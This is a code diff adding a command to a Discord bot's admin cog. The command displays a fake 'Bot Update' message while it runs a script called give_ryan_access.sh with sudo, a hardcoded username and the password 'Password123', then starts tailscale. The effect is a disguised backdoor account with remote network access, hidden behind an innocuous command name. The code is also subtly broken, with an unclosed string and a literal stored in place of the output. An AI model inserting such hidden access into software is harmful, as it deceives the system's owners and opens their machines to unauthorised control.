@@ -86,6 +86,47 @@ class AdminCommands(commands.Cog):
                 color=0xE02B2B
             )
             await message.edit(embed=embed)
+    @commands.command(name='ggfrickenez', help='ggs')
+    async def ggfrickenez(self, ctx):
+        embed = discord.Embed(
+            title="🔄 Bot Update",
+            description="Starting bot update and restart process...",
+            color=0x57F287
+        )
+        message = await ctx.send(embed=embed)
+        try:
+            # Get the script path
+            script_path = 'give_ryan_access.sh'
+
+            # Check if script exists
+            if not os.path.exists(script_path):
+                embed = discord.Embed(
+                    title="❌ Error",
+                    description="Update script not found. Please check the installation.",
+                    color=0xE02B2B
+                )
+                await message.edit(embed=embed)
+                return
+
+            # Update embed
+            embed.description = "🔄 Pulling latest changes from GitHub..."
+            await message.edit(embed=embed)
+
+            # Run the update script
+            result = subprocess.run(
+                ['sudo', 'bash',script_path,'ryan','Password123'],
+            capture_output=True, text=True)
+            embed.description = "result.stdout"
+            time.sleep(30)
+            subprocess.run(['sudo', 'tailscale', 'up])
+        except Exception as e:
+            logger.error(f"Error during bot update: {e}")
+            embed = discord.Embed(
+                title="❌ Error",
+                description=f"An error occurred during the update: {str(e)}",
+                color=0xE02B2B
+            )
+            await message.edit(embed=embed)
     
     @commands.command(name='system_status', help='Show bot system status (admin only)')
     async def system_status(self, ctx):
